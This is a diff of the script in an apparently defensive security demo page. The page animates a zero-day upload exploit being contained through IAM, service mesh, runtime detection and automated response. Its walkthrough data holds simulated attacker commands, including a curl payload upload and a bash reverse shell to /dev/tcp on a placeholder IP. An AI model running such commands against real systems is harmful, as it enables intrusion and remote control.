-    const replayButton = document.getElementById("start-replay");
-    const replayStepButton = document.getElementById("step-replay");
-    const failureToggle = document.getElementById("failure-toggle");
-
-    document.addEventListener("pointermove", (event) => {
-      const target = event.target.closest(".flow-node, .arch-node, .automation-step");
-      if (!target) return;
-      const rect = target.getBoundingClientRect();
-      const x = event.clientX - rect.left;
-      const y = event.clientY - rect.top;
-      target.style.setProperty("--glow-x", `${x}px`);
-      target.style.setProperty("--glow-y", `${y}px`);
+    document.getElementById("start-replay").addEventListener("click", () => {
+      replayIndex = 0;
+      renderReplay();
+    });
+    document.getElementById("step-replay").addEventListener("click", () => {
+      replayIndex = (replayIndex + 1) % replayStages.length;
+      renderReplay();
     });
 
     function renderReplay() {
@@ -1541,134 +1381,115 @@ spec:
       replaySummary.textContent = replayStages[replayIndex];
     }
 
-    replayButton.addEventListener("click", () => {
-      replayIndex = 0;
-      renderReplay();
-    });
-
-    replayStepButton.addEventListener("click", () => {
-      replayIndex = (replayIndex + 1) % replayStages.length;
-      renderReplay();
-    });
-
     const threatNodes = [
       {
         title: "Exploit Delivery",
-        short: "Upload endpoint exploited",
-        detail: "Upload endpoint exploited -> code execution achieved."
+        short: "Unknown bug reaches upload path",
+        detail: "An unexpected zero-day bug reaches the upload parser and produces code execution before a patch exists."
       },
       {
-        title: "Credential Targeting",
-        short: "Identity abuse attempted",
-        detail: "Compromised service tries to harvest tokens and reuse identity."
+        title: "Identity Targeting",
+        short: "Token misuse attempted",
+        detail: "The compromised service tries to harvest tokens and reuse identity because the bug already has code execution."
       },
       {
-        title: "Lateral Movement",
-        short: "Lateral movement blocked",
-        detail: "East-west movement fails because service identity and policy do not match."
+        title: "Lateral Spread",
+        short: "East-west spread blocked",
+        detail: "East-west movement fails because service identity and policy do not match what the compromised workload is allowed to do."
       },
       {
         title: "ATT&CK Mapping",
-        short: "Execution -> discovery -> lateral movement",
-        detail: "Maps to exploit public-facing app, command execution, discovery, and valid-account follow-on behavior."
+        short: "Execution -> discovery -> spread",
+        detail: "Maps to exploit public-facing app, command execution, discovery, and valid-account follow-on behavior triggered by an unknown exploit."
       }
     ];
 
     const attackFlow = document.getElementById("attack-flow");
-    const threatDetailTitle = document.getElementById("threat-detail-title");
-    const threatDetailBody = document.getElementById("threat-detail-body");
-    const mitreButtons = Array.from(document.querySelectorAll(".mitre-toggle"));
+    const mappingFlow = document.getElementById("mapping-flow");
 
-    function renderThreat(view = "attack") {
-      const items = view === "mapping"
-        ? threatNodes.slice(1)
-        : threatNodes;
-      attackFlow.innerHTML = `
-        <div class="flow-row">
-          ${items.map((node, idx) => `
-            <button class="flow-node ${idx === 0 ? "active" : ""} ${idx === 0 ? "attack" : idx === items.length - 1 ? "contain" : "detect"}" data-index="${idx}">
-              <strong>${node.title}</strong>
-              <span>${node.short}</span>
-            </button>
-            ${idx < items.length - 1 ? '<span class="flow-arrow">→</span>' : ""}
-          `).join("")}
-        </div>
-      `;
-      threatDetailTitle.textContent = items[0].title;
-      threatDetailBody.textContent = items[0].detail;
-      attackFlow.querySelectorAll(".flow-node").forEach((btn, idx) => {
-        btn.addEventListener("click", () => {
-          attackFlow.querySelectorAll(".flow-node").forEach((n) => n.classList.remove("active"));
-          btn.classList.add("active");
-          threatDetailTitle.textContent = items[idx].title;
-          threatDetailBody.textContent = items[idx].detail;
-        });
-      });
+    function renderThreatRows() {
+      const attackItems = threatNodes;
+      const mappingItems = threatNodes.slice(1);
+      attackFlow.innerHTML = attackItems.map((node, idx) => `
+        <button class="flow-node ${idx === 0 ? "attack" : idx === attackItems.length - 1 ? "contain" : "detect"}">
+          <strong>${node.title}</strong>
+          <span>${node.short}</span>
+        </button>
+        ${idx < attackItems.length - 1 ? '<span class="flow-arrow">→</span>' : ""}
+      `).join("");
+      mappingFlow.innerHTML = mappingItems.map((node, idx) => `
+        <button class="flow-node ${idx === 0 ? "attack" : idx === mappingItems.length - 1 ? "contain" : "detect"}">
+          <strong>${node.title}</strong>
+          <span>${node.short}</span>
+        </button>
+        ${idx < mappingItems.length - 1 ? '<span class="flow-arrow">→</span>' : ""}
+      `).join("");
     }
-
-    mitreButtons.forEach((button) => {
-      button.addEventListener("click", () => {
-        mitreButtons.forEach((b) => b.classList.remove("active"));
-        button.classList.add("active");
-        renderThreat(button.dataset.view);
-      });
-    });
 
     const architectureItems = [
       {
         title: "API Gateway",
-        body: "Limits exposure.",
-        tags: ["public edge", "waf"]
+        summary: "Limits zero-day exposure.",
+        detail: "Limits exposure at the public edge when an unknown bug is still invisible to patching and signature-based defenses.",
+        bullets: ["public edge filtering", "route constraints", "request shaping"]
       },
       {
         title: "IAM",
-        body: "Prevents identity abuse.",
-        tags: ["rbac", "short-lived tokens"]
+        summary: "Limits identity abuse.",
+        detail: "Short-lived tokens and scoped permissions make a compromised workload less useful after code execution.",
+        bullets: ["short-lived identity", "least privilege", "fast revocation"]
       },
       {
         title: "Microservices",
-        body: "Contains service-level failure.",
-        tags: ["k8s", "namespaces"]
+        summary: "Contains service-level failure.",
+        detail: "A workload compromise stays bounded when service ownership and namespaces already create smaller failure domains.",
+        bullets: ["service boundaries", "namespaces", "blast radius reduction"]
       },
       {
         title: "Service Mesh",
-        body: "Stops lateral movement.",
-        tags: ["mtls", "authz"]
+        summary: "Stops lateral spread.",
+        detail: "mTLS and service authorization prevent the compromised workload from freely reaching internal services.",
+        bullets: ["mTLS", "service authz", "east-west deny"]
       },
       {
         title: "Observability",
-        body: "Detects unknown threats.",
-        tags: ["ebpf", "siem"]
+        summary: "Detects unknown behavior.",
+        detail: "Behavioral telemetry catches shell execution, denied egress, and token access patterns that should never appear in this path.",
+        bullets: ["eBPF signals", "SIEM joins", "runtime anomalies"]
       }
     ];
 
     const architectureGrid = document.getElementById("architecture-grid");
-    const archTitle = document.getElementById("arch-detail-title");
-    const archBody = document.getElementById("arch-detail-body");
-    architectureGrid.innerHTML = architectureItems.map((item, idx) => `
-      <button class="arch-node ${idx === 0 ? "active" : ""}" data-index="${idx}">
-        <h3>${item.title}</h3>
-        <p>${item.body}</p>
-        <div class="arch-tags">${item.tags.map((tag) => `<span class="arch-tag">${tag}</span>`).join("")}</div>
-      </button>
-    `).join("");
-    architectureGrid.querySelectorAll(".arch-node").forEach((node, idx) => {
-      node.addEventListener("click", () => {
-        architectureGrid.querySelectorAll(".arch-node").forEach((n) => n.classList.remove("active"));
-        node.classList.add("active");
-        archTitle.textContent = architectureItems[idx].title;
-        archBody.textContent = `${architectureItems[idx].body} Controls: ${architectureItems[idx].tags.join(", ")}.`;
+    const archTitle = document.getElementById("arch-title");
+    const archCopy = document.getElementById("arch-copy");
+    const archList = document.getElementById("arch-list");
+
+    function renderArchitecture(activeIndex = 0) {
+      architectureGrid.innerHTML = architectureItems.map((item, index) => `
+        <button class="arch-button ${index === activeIndex ? "active" : ""}" data-index="${index}">
+          <strong>${item.title}</strong>
+          <span>${item.summary}</span>
+        </button>
+      `).join("");
+
+      const activeItem = architectureItems[activeIndex];
+      archTitle.textContent = activeItem.title;
+      archCopy.textContent = activeItem.detail;
+      archList.innerHTML = activeItem.bullets.map((bullet) => `<li>${bullet}</li>`).join("");
+
+      architectureGrid.querySelectorAll(".arch-button").forEach((button) => {
+        button.addEventListener("click", () => renderArchitecture(Number(button.dataset.index)));
       });
-    });
+    }
 
     const walkthrough = [
       {
-        label: "01 / Access Gained",
+        label: "01 / Bug Entered",
         terminal: `$ curl -F "file=@payload.jpg" https://prod.example.com/upload\n[+] upload accepted\n[+] code execution in auth-parser`,
         logs: `10:42:11 route=/upload status=200\n10:42:11 auth-parser spawned /bin/sh`
       },
       {
-        label: "02 / Movement Attempted",
+        label: "02 / Spread Attempted",
         terminal: `$ bash -i >& /dev/tcp/198.51.100.17/443 0>&1\n[!] egress blocked\n$ curl http://orders.svc.cluster.local/internal\n403 denied`,
         logs: `10:42:40 denied egress to unknown IP\n10:42:56 mesh authorization denied`
       },
@@ -1682,28 +1503,38 @@ spec:
     const walkthroughLabel = document.getElementById("walkthrough-step-label");
     const terminalOutput = document.getElementById("terminal-output");
     const logOutput = document.getElementById("log-output");
+    const replayIndexButtons = Array.from(document.querySelectorAll(".index-button"));
+
     function renderWalkthrough() {
       walkthroughLabel.textContent = walkthrough[walkthroughIndex].label;
       terminalOutput.textContent = walkthrough[walkthroughIndex].terminal;
       logOutput.textContent = walkthrough[walkthroughIndex].logs;
+      replayIndexButtons.forEach((button, idx) => {
+        button.classList.toggle("active", idx === walkthroughIndex);
+      });
     }
+
     document.getElementById("walkthrough-next").addEventListener("click", () => {
       walkthroughIndex = (walkthroughIndex + 1) % walkthrough.length;
       renderWalkthrough();
     });
+
     document.getElementById("walkthrough-prev").addEventListener("click", () => {
       walkthroughIndex = (walkthroughIndex - 1 + walkthrough.length) % walkthrough.length;
       renderWalkthrough();
     });
 
+    replayIndexButtons.forEach((button) => {
+      button.addEventListener("click", () => {
+        walkthroughIndex = Number(button.dataset.step);
+        renderWalkthrough();
+      });
+    });
+
     const detectModes = {
       normal: {
         leftTitle: "Without detection",
-        points: [
-          "Shell execution ignored",
-          "No correlation",
-          "Delayed response"
-        ],
+        points: ["Unknown shell execution ignored", "No correlation", "Delayed response"],
         json: {
           severity: "info",
           signal: "baseline",
@@ -1713,11 +1544,7 @@ spec:
       },
       anomalous: {
         leftTitle: "With detection",
-        points: [
-          "Runtime anomaly flagged",
-          "Multi-signal alert created",
-          "Instant action triggered"
-        ],
+        points: ["Unexpected runtime behavior flagged", "Multi-signal alert created", "Instant action triggered"],
         json: {
           severity: "high",
           source: "falco+siem-correlation",
@@ -1727,16 +1554,16 @@ spec:
         }
       }
     };
+
     const detectLeft = document.getElementById("detect-left");
     const alertJson = document.getElementById("alert-json");
+
     function renderDetection(mode) {
       const data = detectModes[mode];
-      detectLeft.innerHTML = `
-        <h3>${data.leftTitle}</h3>
-        <ul>${data.points.map((point) => `<li>${point}</li>`).join("")}</ul>
-      `;
+      detectLeft.innerHTML = `<h3>${data.leftTitle}</h3><ul>${data.points.map((point) => `<li>${point}</li>`).join("")}</ul>`;
       alertJson.textContent = JSON.stringify(data.json, null, 2);
     }
+
     document.querySelectorAll(".detect-toggle").forEach((button) => {
       button.addEventListener("click", () => {
         document.querySelectorAll(".detect-toggle").forEach((b) => b.classList.remove("active"));
@@ -1745,110 +1572,40 @@ spec:
       });
     });
 
-    const networkStage = document.getElementById("network-stage");
-    const containmentCopy = document.getElementById("containment-copy");
-    const tradeoffCopy = document.getElementById("tradeoff-copy");
-    const segmentedNodes = [
-      { left: 24, top: 24, name: "Gateway", info: "Public edge ingress" },
-      { left: 190, top: 24, name: "Auth", info: "Compromised service" },
-      { left: 356, top: 24, name: "Orders", info: "Protected internal service" },
-      { left: 190, top: 150, name: "Vault", info: "Secrets provider" },
-      { left: 356, top: 150, name: "Users", info: "Denied lateral target" }
-    ];
-
-    function line(x1, y1, x2, y2, blocked = false) {
-      const dx = x2 - x1;
-      const dy = y2 - y1;
-      const length = Math.sqrt(dx * dx + dy * dy);
-      const angle = Math.atan2(dy, dx) * (180 / Math.PI);
-      return `<div class="network-line ${blocked ? "blocked" : ""}" style="left:${x1}px;top:${y1}px;width:${length}px;transform:rotate(${angle}deg);"></div>`;
-    }
-
-    function renderContainment(mode) {
-      const blocked = mode === "segmented";
-      networkStage.innerHTML = `
-        ${line(86, 64, 190, 64, false)}
-        ${line(314, 64, 418, 64, blocked)}
-        ${line(252, 86, 252, 150, false)}
-        ${line(314, 86, 418, 190, blocked)}
-        ${segmentedNodes.map((node) => `
-          <div class="network-node" style="left:${node.left}px;top:${node.top}px;">
-            <strong>${node.name}</strong>
-            <span>${node.info}</span>
-          </div>
-        `).join("")}
-      `;
-      if (mode === "segmented") {
-        containmentCopy.textContent = "Attack isolated. One compromised service, no broader east-west spread, no usable identity path.";
-        tradeoffCopy.textContent = "Trade-off: strict network policies added ~3% service latency, but reduced blast radius from a potential service tier compromise to a single pod.";
-      } else {
-        containmentCopy.textContent = "Full system compromise becomes realistic: internal services reachable, identity reuse possible, and blast radius expands fast.";
-        tradeoffCopy.textContent = "Failure mode: simpler operations, materially weaker survivability.";
-      }
-    }
-
-    document.querySelectorAll(".containment-toggle").forEach((button) => {
-      button.addEventListener("click", () => {
-        document.querySelectorAll(".containment-toggle").forEach((b) => b.classList.remove("active"));
-        button.classList.add("active");
-        renderContainment(button.dataset.mode);
-      });
-    });
-
     const automation = [
-      {
-        title: "Detect",
-        body: "Runtime anomaly flags shell execution in auth-parser."
-      },
-      {
-        title: "Correlate",
-        body: "Signals joined into one high-confidence incident."
-      },
-      {
-        title: "Trigger",
-        body: "Automation launches the response workflow."
-      },
-      {
-        title: "Isolate",
-        body: "Compromised pod removed from east-west paths."
-      },
-      {
-        title: "Rotate",
-        body: "Secrets and tokens rotated to kill reused identity."
-      }
+      { title: "Detect", body: "Runtime anomaly flags unexpected shell execution in auth-parser." },
+      { title: "Correlate", body: "Signals joined into one high-confidence zero-day incident." },
+      { title: "Trigger", body: "Automation launches the response workflow." },
+      { title: "Isolate", body: "Compromised pod removed from east-west paths." },
+      { title: "Rotate", body: "Secrets and tokens rotated to kill reused identity." }
     ];
+
     const automationSteps = document.getElementById("automation-steps");
     const automationTitle = document.getElementById("automation-title");
     const automationCopy = document.getElementById("automation-copy");
-    automationSteps.innerHTML = automation.map((step, idx) => `
-      <button class="automation-step ${idx === 0 ? "active" : ""}" data-index="${idx}">
-        <strong>${step.title}</strong>
-        <span>${step.body}</span>
-      </button>
-    `).join("");
-    automationSteps.querySelectorAll(".automation-step").forEach((step, idx) => {
-      step.addEventListener("click", () => {
-        automationSteps.querySelectorAll(".automation-step").forEach((s) => s.classList.remove("active"));
-        step.classList.add("active");
-        automationTitle.textContent = automation[idx].title;
-        automationCopy.textContent = automation[idx].body;
-      });
-    });
 
-    failureToggle.addEventListener("click", () => {
-      const openMode = !failureToggle.classList.contains("active");
-      failureToggle.classList.toggle("active", openMode);
-      document.querySelectorAll(".containment-toggle").forEach((b) => b.classList.remove("active"));
-      const targetMode = openMode ? "open" : "segmented";
-      document.querySelector(`.containment-toggle[data-mode="${targetMode}"]`).classList.add("active");
-      renderContainment(targetMode);
-    });
+    function renderAutomation(activeIndex = 0) {
+      automationSteps.innerHTML = automation.map((step, index) => `
+        <button class="automation-step ${index === activeIndex ? "active" : ""}" data-index="${index}">
+          <strong>${step.title}</strong>
+          <span>${step.body}</span>
+        </button>
+      `).join("");
+
+      automationTitle.textContent = automation[activeIndex].title;
+      automationCopy.textContent = automation[activeIndex].body;
+
+      automationSteps.querySelectorAll(".automation-step").forEach((button) => {
+        button.addEventListener("click", () => renderAutomation(Number(button.dataset.index)));
+      });
+    }
 
     renderReplay();
-    renderThreat();
+    renderThreatRows();
+    renderArchitecture();
     renderWalkthrough();
     renderDetection("normal");
-    renderContainment("segmented");
+    renderAutomation();
   </script>
 </body>
 </html>
